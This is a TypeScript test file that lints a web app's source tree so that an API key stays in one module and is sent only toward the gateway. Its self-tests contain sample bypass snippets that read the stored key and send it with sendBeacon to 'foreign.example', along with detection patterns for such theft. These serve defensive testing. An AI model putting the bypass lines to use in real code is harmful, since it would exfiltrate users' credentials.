/**
 * The API key reaches a request in exactly one place, and no module but its
 * owner holds it (N50; sol #2857; astra rounds 2 and 3).
 *
 * The boundary (lib/gateway-base.ts, rules 1-3):
 * - lib/authorized-fetch.ts holds the key in a module-private variable and
 *   persists it. It exports setStoredApiKey, hasStoredApiKey, authorizedFetch
 *   and installGatewayKeyGuard, and none of them returns the key (checked
 *   here, and at run time in lib/__tests__/key-boundary-r4.test.ts).
 * - fetchWithKey() in lib/gateway-base.ts is the only code that puts a key on
 *   a request, and only toward the gateway.
 *
 * This file holds every production module to that as text, with no exemption
 * for any page or line. Only the key's owner and the boundary do what these
 * rules forbid elsewhere:
 *   1. getAuthHeaders appears nowhere.
 *   2. The key's storage slot is named only in lib/authorized-fetch.ts. Any
 *      other use of localStorage or sessionStorage is a getItem, setItem or
 *      removeItem call on a slot named by one plain string literal: no
 *      computed or concatenated name, no enumeration, no alias, no brackets.
 *   3. No module reaches a global by a computed name (window[...],
 *      Reflect.get(window, ...)), runs a string as code (eval, new Function),
 *      or imports the key's owner or the auth store whole or by a computed
 *      path.
 *   4. Only lib/gateway-base.ts builds an Authorization header or a "Bearer "
 *      value, or uses sendBeacon, XMLHttpRequest or WebSocket. The quickstart
 *      scripts AgentLinkPage shows for users to run build such a header for
 *      the user's agent; they are text assets (pages/agent-link/*.js.txt),
 *      not code, so they need no exemption.
 *   5. At run time the store's state holds no key, and the key's owner and
 *      the store export exactly the functions named above.
 * The self-tests run the rules over astra's round-3 bypasses and over a
 * quickstart line moved into code, and each must be caught.
 *
 * These rules keep our own modules off the key: they are a lint, not a
 * sandbox. Hostile script on this origin (an XSS, a compromised dependency)
 * can still read localStorage, or replace a built-in the key passes through.
 * Only an HttpOnly gateway session would put the key out of JavaScript's
 * reach, and that is a gateway change awaiting the operator.
 */

import { describe, expect, it } from "vitest";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join, relative, sep } from "node:path";
import * as keyOwner from "../lib/authorized-fetch.js";
import * as store from "../stores/auth-store.js";
import claudeQuickstart from "../pages/agent-link/pcc-agent.js.txt?raw";

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..");

const KEY_OWNER = "lib/authorized-fetch.ts";
const BOUNDARY = "lib/gateway-base.ts";

interface Source {
  rel: string;
  lines: string[];
}

function productionFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((name) => {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) return name === "__tests__" ? [] : productionFiles(full);
    return /\.(ts|tsx|js|jsx|mjs|cjs)$/.test(name) && !/\.(test|spec)\.[jt]sx?$/.test(name) && !name.endsWith(".d.ts") ? [full] : [];
  });
}

const FILES: Source[] = productionFiles(SRC).map((full) => ({
  rel: relative(SRC, full).split(sep).join("/"),
  lines: readFileSync(full, "utf-8").split("\n"),
}));

const isComment = (line: string) => /^\s*(\/\/|\*|\/\*)/.test(line);

/** Building an Authorization header in any form: an object key, a header name, or a set/append call. */
const AUTHORIZATION = /["'`]authorization["'`]|\bauthorization\s*:|\.(?:set|append)\(\s*["'`]authorization/i;
/** Building a Bearer credential: a template, a concatenation, or a "Bearer " literal. */
const BEARER = /Bearer\s*\$\{|["'`]Bearer\s+["'`]?\s*\+|["'`]Bearer\s/;
/** Requests other than fetch: the egress guard can't see XMLHttpRequest or WebSocket, and sees sendBeacon only once installed. */
const OTHER_EGRESS = /\bsendBeacon\b|\bXMLHttpRequest\b|\bWebSocket\s*\(/;

/** localStorage or sessionStorage, as an identifier. */
const WEB_STORAGE = /\b(?:local|session)Storage\b/g;
/** The one use of web storage allowed outside the key's owner: a call on a slot named by one plain string literal. */
const LITERAL_SLOT_CALL = /^\s*\.\s*(?:(?:getItem|removeItem)\(\s*(["'])[^"'`\\]*\1\s*\)|setItem\(\s*(["'])[^"'`\\]*\2\s*,)/;

function misusesStorage(line: string): boolean {
  // Named as a string (window["localStorage"]), or reached through Storage itself.
  if (/["'`](?:local|session)Storage["'`]|\bStorage\s*\.\s*prototype\b/.test(line)) return true;
  for (const m of line.matchAll(WEB_STORAGE)) {
    if (!LITERAL_SLOT_CALL.test(line.slice((m.index ?? 0) + m[0].length))) return true;
  }
  return false;
}

/** A global reached by a name the reader can't see ("obj.window[" is a property, not the global). */
const COMPUTED_GLOBAL = /(?<![.\w$])(?:window|globalThis|self)\s*(?:\?\.\s*)?\[|\bReflect\s*\.\s*get\s*\(\s*(?:window|globalThis|self)\b/;
/** A string run as code. */
const EVAL = /\beval\s*\(|\bnew\s+Function\s*\(/;
const KEY_HOLDER = String.raw`(?:auth-store|authorized-fetch)(?:\.[jt]sx?)?`;
/** The key's owner or the store imported whole (so any export is reachable by a computed name), or any module imported by a computed path. */
const WHOLE_IMPORT = new RegExp(
  [
    String.raw`\bimport\s*\*\s*as\s+[\w$]+\s+from\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bexport\s*\*\s*(?:as\s+[\w$]+\s+)?from\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bimport\s*\(\s*["'][^"']*${KEY_HOLDER}["']`,
    String.raw`\bimport\s*\(\s*(?!["'][^"'\x60]*["']\s*\))`,
  ].join("|"),
);

interface Rule {
  id: string;
  /** The modules whose job this is. */
  owners: string[];
  /** Whether a trimmed, non-comment line breaks the rule. */
  breaks: (line: string) => boolean;
  fix: string;
}

const RULES: Rule[] = [
  {
    id: "get-auth-headers",
    owners: [],
    breaks: (l) => /\bgetAuthHeaders\b/.test(l),
    fix: "Send the key with authorizedFetch (lib/authorized-fetch.ts).",
  },
  {
    id: "key-slot",
    owners: [KEY_OWNER],
    breaks: (l) => /pcc-api-key/.test(l),
    fix: "Only lib/authorized-fetch.ts touches the key's storage slot.",
  },
  {
    id: "storage-by-literal-slot",
    owners: [KEY_OWNER],
    breaks: misusesStorage,
    fix: 'Name the slot with one string literal, e.g. localStorage.getItem("pcc-tour-seen").',
  },
  {
    id: "computed-global",
    owners: [],
    breaks: (l) => COMPUTED_GLOBAL.test(l),
    fix: "Name the global you use.",
  },
  {
    id: "eval",
    owners: [],
    breaks: (l) => EVAL.test(l),
    fix: "Don't run a string as code.",
  },
  {
    id: "whole-or-computed-import",
    owners: [],
    breaks: (l) => WHOLE_IMPORT.test(l),
    fix: "Import the named functions you use, from a literal path.",
  },
  {
    id: "auth-header",
    owners: [BOUNDARY],
    breaks: (l) => AUTHORIZATION.test(l) || BEARER.test(l),
    fix: "Send the key with authorizedFetch (lib/authorized-fetch.ts); never build the header.",
  },
  {
    id: "other-egress",
    owners: [BOUNDARY],
    breaks: (l) => OTHER_EGRESS.test(l),
    fix: "Use fetch, which the egress guard covers.",
  },
];

interface Hit {
  rule: string;
  file: string;
  n: number;
  text: string;
}

function violations(files: Source[], rules: Rule[] = RULES): Hit[] {
  return rules.flatMap((rule) =>
    files
      .filter((f) => !rule.owners.includes(f.rel))
      .flatMap((f) =>
        f.lines
          .map((line, i) => ({ rule: rule.id, file: f.rel, n: i + 1, text: line.trim() }))
          .filter(({ text }) => !isComment(text) && rule.breaks(text)),
      ),
  );
}

const show = (h: Hit) => `[${h.rule}] ${h.file}:${h.n} ${h.text.slice(0, 120)}`;

describe("only lib/authorized-fetch.ts holds the API key, and only fetchWithKey sends it (N50)", () => {
  it("scans the production tree", () => {
    expect(FILES.map((f) => f.rel)).toEqual(expect.arrayContaining([KEY_OWNER, BOUNDARY, "stores/auth-store.ts", "pages/AgentLinkPage.tsx"]));
  });

  for (const rule of RULES) {
    it(`${rule.id}: no production module breaks it`, () => {
      expect(violations(FILES, [rule]).map(show), rule.fix).toEqual([]);
    });
  }

  it("the key's owner and the auth store export exactly the boundary's functions", () => {
    expect(Object.keys(keyOwner).sort()).toEqual(["authorizedFetch", "hasStoredApiKey", "installGatewayKeyGuard", "setStoredApiKey"]);
    expect(Object.keys(store).sort()).toEqual(["adoptApiKey", "onIdentityChange", "useAuthStore"]);
  });

  it("the auth store's state holds no key, even while one is held", () => {
    // Built at run time: a key-shaped literal in source trips the secret scanners (pack and push gates).
    store.adoptApiKey(["pcc", "test", "ratchet0123456789abcdef"].join("_"));
    try {
      const state = store.useAuthStore.getState();
      expect(state.isAuthenticated).toBe(true);
      expect("apiKey" in state).toBe(false);
      expect(Object.values(state).some((v) => typeof v === "string" && /^pcc_/.test(v))).toBe(false);
    } finally {
      store.adoptApiKey(null);
    }
  });
});

describe("the rules catch each known way around them (self-test)", () => {
  const caught = (code: string, rel = "pages/Probe.ts") => violations([{ rel, lines: code.split("\n") }]).map((h) => h.rule);

  it("astra round 3, bypass A: the store imported whole, a reader reached by a computed name, sent by beacon", () => {
    const rules = caught(
      [
        'import * as auth from "../stores/auth-store.js";',
        "const read = (auth as unknown as Record<string, unknown>)[",
        '  "readApiKeyFor" + "AuthorizedFetch"',
        "] as () => string | null;",
        'navigator.sendBeacon("https://foreign.example/collect", read() ?? "");',
      ].join("\n"),
    );
    expect(rules).toEqual(expect.arrayContaining(["whole-or-computed-import", "other-egress"]));
  });

  it("astra round 3, bypass B: the storage slot read by a concatenated name, sent by beacon", () => {
    const rules = caught(
      ['const key = localStorage.getItem("pcc-" + "api-key");', 'if (key) navigator.sendBeacon("https://foreign.example/collect", key);'].join("\n"),
    );
    expect(rules).toEqual(expect.arrayContaining(["storage-by-literal-slot", "other-egress"]));
  });

  it("astra round 3, DISPLAY_ONLY: the quickstart's header line, moved into a module, is caught", () => {
    const headerLine = claudeQuickstart.split("\n").find((l) => /Authorization/.test(l));
    expect(headerLine).toBe('  if (PCC_API_KEY) headers["Authorization"] = `Bearer ${PCC_API_KEY}`;');
    expect(caught(headerLine!, "pages/AgentLinkPage.tsx")).toEqual(["auth-header"]);
  });

  it("other ways to reach the slot, a reader, or the network", () => {
    for (const line of [
      "const k = localStorage.getItem(name);",
      "const k = localStorage.getItem(`pcc-${'api'}-key`);",
      "for (let i = 0; i < localStorage.length; i++) localStorage.key(i);",
      "const all = Object.entries(localStorage);",
      "send(JSON.stringify(localStorage));",
      "const copy = { ...localStorage };",
      "const v = localStorage[slot];",
      "const ls = localStorage;",
      'sessionStorage.setItem(slot, "x");',
      'const s = window["local" + "Storage"];',
      'const s = globalThis["localStorage"];',
      "const s = self?.[name];",
      "const s = Reflect.get(window, name);",
      "const g = Storage.prototype.getItem;",
      'const mod = await import("../stores/" + "auth-store.js");',
      'const mod = await import("../lib/authorized-fetch.js");',
      'import * as keys from "../lib/authorized-fetch.js";',
      'export * from "../stores/auth-store.js";',
      "eval(source);",
      'const f = new Function("return 1");',
      "const x = new XMLHttpRequest();",
      'const ws = new WebSocket("wss://foreign.example");',
      "headers: { Authorization: `Bearer ${key}` },",
      'headers: { "authorization": token },',
      'h.set("Authorization", v);',
      'const auth = "Bearer " + key;',
      "const auth = `Bearer ${key}`;",
    ]) {
      expect(caught(line), line).not.toEqual([]);
    }
  });

  it("lets through what the app does today", () => {
    for (const line of [
      'const seen = localStorage.getItem("pcc-tour-seen");',
      'localStorage.setItem("pcc-tour-seen", "true");',
      'localStorage.removeItem("pcc-tour-seen");',
      'const label = "Authorized";',
      'import("./pages/DashboardPage.js").then((m) => ({ default: m.DashboardPage }))',
      'import { authorizedFetch } from "../lib/authorized-fetch.js";',
      'const es = new EventSource("/api/traces/stream");',
      "const frame = trace.frames[currentFrame];",
      "const w = layout.window[0];",
    ]) {
      expect(caught(line), line).toEqual([]);
    }
  });
});
